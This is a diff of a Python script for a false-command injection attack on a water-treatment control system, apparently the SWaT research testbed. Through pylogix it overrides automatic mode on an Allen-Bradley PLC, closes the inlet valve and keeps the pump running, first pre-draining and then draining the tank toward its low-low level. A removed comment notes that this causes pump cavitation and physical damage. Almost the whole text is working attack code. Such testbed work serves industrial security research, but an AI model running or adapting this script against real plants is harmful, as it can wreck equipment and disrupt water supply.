@@ -3,143 +3,183 @@
 phase1_inject.py  —  SWaT Phase 1: False Command Injection (HMI-based)
 Target: Allen-Bradley ControlLogix PLC1 at 192.168.1.10
 
-Running from the HMI directly — no ARP poisoning needed.
-The HMI already has legitimate EtherNet/IP access to PLC1.
-We simply write false tag values directly via pylogix.
-
-Attack:
-  - Take MV101 out of auto, command CLOSE
-  - Take P101 out of auto, command OFF
-  - Loop for duration seconds
-  - On exit: restore safe state
+Attack sequence:
+  1. PRE-DRAIN: Take P101 to manual ON, let LIT101 drain to target level (~300mm)
+  2. ATTACK: Close MV101 (valve shut), P101 stays ON — tank actively drains to LL
+  3. RESTORE: Reopen MV101, restore P101 to auto on exit
 
 Usage:
   python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120
+  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120 --target-level 300
+  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120 --skip-drain
 """
 
-import argparse, time, signal, pickle, os
+import argparse, time, signal
 from datetime import datetime
 from pylogix import PLC
 
-# Attack commands — two-step pattern: disable auto, issue command
+# Attack: close MV101 only — P101 stays ON, tank drains
 ATTACK_CMDS = [
-    ('HMI_MV101.Auto', False),   # take MV101 out of auto mode
-    ('HMI_MV101.Cmd',  1),       # 1=CLOSE inlet valve — stop inflow
-    # P101 left ON (auto mode unchanged) — pump keeps running
-    # This actively drains the tank: LIT101 drops ~1.8mm/s toward LL (250mm)
-    # → pump cavitation → physical damage
-    # I-9 still fires: MV101=CLOSED AND P101.Auto=True AND LIT101 in normal range
-    #   → inlet closed but pump running = tank draining with no refill
+    ('HMI_MV101.Auto', False),   # take MV101 out of auto
+    ('HMI_MV101.Cmd',  1),       # CLOSE inlet valve — stop inflow
+    # P101 intentionally left ON — pump drains the tank actively
 ]
 
-# Safe state to restore on exit
+# Safe state restore
 SAFE_CMDS = [
-    ('HMI_MV101.Auto', False),   # take out of auto first
-    ('HMI_MV101.Cmd',  2),       # 2=OPEN inlet valve
+    ('HMI_MV101.Auto', False),
+    ('HMI_MV101.Cmd',  2),       # OPEN valve
     ('HMI_MV101.Auto', True),    # restore auto
-    ('HMI_P101.Auto',  False),   # take out of auto first
-    ('HMI_P101.Cmd',   2),       # 2=ON start pump
+    ('HMI_P101.Auto',  False),
+    ('HMI_P101.Cmd',   2),       # ensure pump ON
     ('HMI_P101.Auto',  True),    # restore auto
 ]
 
 stop_flag = False
 
 
-def write_tag(plc, tag, value):
-    ret = plc.Write(tag, value)
-    return ret
+def ts():
+    return datetime.now().strftime('%H:%M:%S')
 
 
-def inject_loop(plc_ip, duration, interval=1.0):
-    print(f"[*] Connecting to PLC1 at {plc_ip}...")
-    cycle = 0
+def pre_drain(plc, target_level=300.0, poll=2.0):
+    """
+    Take P101 to manual ON and wait for LIT101 to drain to target_level.
+    This gives the attack more headroom to show dramatic level drop.
+    """
+    print(f"\n[PRE-DRAIN] Taking P101 to manual ON — draining to {target_level}mm")
+    print(f"[PRE-DRAIN] Press Ctrl+C at any time to abort\n")
+
+    plc.Write('HMI_P101.Auto', False)
+    plc.Write('HMI_P101.Cmd',  2)       # manual ON
+
+    while not stop_flag:
+        lit = plc.Read('HMI_LIT101.Pv').Value
+        fit = plc.Read('AI_FIT_101_FLOW').Value
+        mv  = plc.Read('HMI_MV101.Cmd').Value
+        if lit is None:
+            print(f"[{ts()}] LIT101 read failed — check connectivity")
+            time.sleep(poll)
+            continue
+
+        bar = '█' * int(lit / 50) + '░' * (20 - int(lit / 50))
+        print(f"[{ts()}] LIT101={lit:6.1f}mm {bar}  FIT101={fit:.3f}L/s  "
+              f"MV101={'OPEN' if mv==2 else 'CLOSED'}", end='\r')
+
+        if lit <= target_level + 10:
+            print(f"\n[PRE-DRAIN] LIT101={lit:.1f}mm — near target {target_level}mm")
+            print(f"[PRE-DRAIN] Pre-drain complete. Launching attack...\n")
+            break
+
+        time.sleep(poll)
+
+
+def inject_loop(plc, duration, interval=1.0):
+    print(f"[ATTACK] Injecting false commands for {duration}s")
+    print(f"[ATTACK] MV101 → CLOSED   P101 stays ON → tank draining to LL\n")
+
+    cycle    = 0
     end_time = time.time() + duration
 
-    with PLC() as plc:
-        plc.IPAddress = plc_ip
+    while not stop_flag and time.time() < end_time:
+        errors = []
+        for tag, val in ATTACK_CMDS:
+            ret = plc.Write(tag, val)
+            if ret.Status != 'Success':
+                errors.append(f"{tag}: {ret.Status}")
 
-        # Verify connection first
-        test = plc.Read('HMI_LIT101.Pv')
-        if test.Value is None:
-            print(f"[!] Cannot read PLC — check IP and connectivity: {test.Status}")
-            return
+        lit = plc.Read('HMI_LIT101.Pv').Value
+        fit = plc.Read('AI_FIT_101_FLOW').Value
+        mv  = plc.Read('HMI_MV101.Cmd').Value
+        p1a = plc.Read('HMI_P101.Auto').Value
 
-        print(f"[*] Connected. LIT101={test.Value:.1f}mm")
-        print(f"[*] Injecting false commands for {duration}s — Ctrl+C to abort\n")
+        cycle += 1
+        remaining = max(0, int(end_time - time.time()))
 
-        while not stop_flag and time.time() < end_time:
-            errors = []
-            for tag, val in ATTACK_CMDS:
-                ret = write_tag(plc, tag, val)
-                if ret.Status != 'Success':
-                    errors.append(f"{tag}: {ret.Status}")
+        if errors:
+            print(f"[{ts()}] cycle={cycle:4d}  ERRORS: {errors}")
+        else:
+            print(f"[{ts()}] cycle={cycle:4d}  "
+                  f"MV101={'CLOSED' if mv==1 else 'OPEN '}  "
+                  f"P101.Auto={p1a}  "
+                  f"LIT101={lit:.1f}mm  "
+                  f"FIT101={fit:.3f}L/s  "
+                  f"[{remaining}s left]")
 
-            # Read current state to show effect
-            lit = plc.Read('HMI_LIT101.Pv').Value
-            fit = plc.Read('AI_FIT_101_FLOW').Value
-            mv  = plc.Read('HMI_MV101.Cmd').Value
+            # Safety warning if getting critically low
+            if lit is not None and lit < 280:
+                print(f"  *** WARNING: LIT101={lit:.1f}mm approaching LL (250mm) ***")
 
-            cycle += 1
-            ts = datetime.now().strftime('%H:%M:%S')
-            if errors:
-                print(f"[{ts}] cycle={cycle:4d}  ERRORS: {errors}")
-            else:
-                print(f"[{ts}] cycle={cycle:4d}  "
-                      f"MV101={'CLOSED' if mv==1 else 'OPEN'}  "
-                      f"LIT101={lit:.1f}mm  FIT101={fit:.3f}  "
-                      f"[attack active]")
-            time.sleep(interval)
+        time.sleep(interval)
 
 
-def restore_plc(plc_ip):
-    print(f"\n[*] Restoring safe state on PLC {plc_ip}...")
-    try:
-        with PLC() as plc:
-            plc.IPAddress = plc_ip
-            for tag, val in SAFE_CMDS:
-                ret = plc.Write(tag, val)
-                status = ret.Status
-                print(f"    {tag} = {val}  [{status}]")
+def restore_plc(plc):
+    print(f"\n[RESTORE] Restoring safe state...")
+    for tag, val in SAFE_CMDS:
+        ret = plc.Write(tag, val)
+        print(f"    {tag:25s} = {val}  [{ret.Status}]")
 
-        # Verify
-        with PLC() as plc:
-            plc.IPAddress = plc_ip
-            mv  = plc.Read('HMI_MV101.Cmd').Value
-            p1a = plc.Read('HMI_P101.Auto').Value
-            lit = plc.Read('HMI_LIT101.Pv').Value
-            print(f"\n[+] Verified: MV101={'OPEN' if mv==2 else 'CLOSED'}  "
-                  f"P101.Auto={p1a}  LIT101={lit:.1f}mm")
-        print("[+] Safe state restored.")
-    except Exception as e:
-        print(f"[!] Restore failed: {e}")
-        print("    *** Manually restore MV101 and P101 via HMI interface! ***")
+    time.sleep(1)
+    mv  = plc.Read('HMI_MV101.Cmd').Value
+    p1a = plc.Read('HMI_P101.Auto').Value
+    lit = plc.Read('HMI_LIT101.Pv').Value
+    print(f"\n[RESTORE] Verified: MV101={'OPEN' if mv==2 else 'CLOSED'}  "
+          f"P101.Auto={p1a}  LIT101={lit:.1f}mm")
+    print("[RESTORE] Safe state restored.")
 
 
 def signal_handler(sig, frame):
     global stop_flag
-    print("\n[!] Ctrl+C — stopping attack...")
+    print(f"\n[!] Ctrl+C — stopping...")
     stop_flag = True
 
 
 def main():
     ap = argparse.ArgumentParser()
-    ap.add_argument('--plc-ip',   default='192.168.1.10', help='PLC1A IP address')
-    ap.add_argument('--duration', type=int, default=120,  help='Attack duration in seconds')
-    ap.add_argument('--interval', type=float, default=1.0, help='Write interval in seconds')
+    ap.add_argument('--plc-ip',       default='192.168.1.10')
+    ap.add_argument('--duration',     type=int,   default=120)
+    ap.add_argument('--interval',     type=float, default=1.0)
+    ap.add_argument('--target-level', type=float, default=300.0,
+                    help='Drain to this level (mm) before launching attack')
+    ap.add_argument('--skip-drain',   action='store_true',
+                    help='Skip pre-drain, attack immediately')
     args = ap.parse_args()
 
     signal.signal(signal.SIGINT, signal_handler)
 
     print("=" * 60)
-    print("  SWaT Phase 1 — Direct CIP Tag Injection (HMI-based)")
+    print("  SWaT Phase 1 — Direct CIP Tag Injection")
     print(f"  PLC: {args.plc_ip}   Duration: {args.duration}s")
+    if not args.skip_drain:
+        print(f"  Pre-drain to: {args.target_level}mm")
     print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print("=" * 60)
-    print("[*] Note: Running from HMI — no ARP poisoning needed")
-    print("[*] HMI has direct EtherNet/IP access to PLC1\n")
 
-    inject_loop(args.plc_ip, args.duration, args.interval)
-    restore_plc(args.plc_ip)
+    with PLC() as plc:
+        plc.IPAddress = args.plc_ip
+
+        # Connectivity check
+        test = plc.Read('HMI_LIT101.Pv')
+        if test.Value is None:
+            print(f"[!] Cannot reach PLC at {args.plc_ip}: {test.Status}")
+            return
+        print(f"[*] Connected. LIT101={test.Value:.1f}mm\n")
+
+        # Step 1: Pre-drain (optional)
+        if not args.skip_drain:
+            pre_drain(plc, target_level=args.target_level)
+
+        if stop_flag:
+            print("[!] Aborted during pre-drain — restoring...")
+            restore_plc(plc)
+            return
+
+        # Step 2: Attack
+        inject_loop(plc, args.duration, args.interval)
+
+        # Step 3: Restore
+        restore_plc(plc)
+
     print("[+] Phase 1 complete.")
 
 
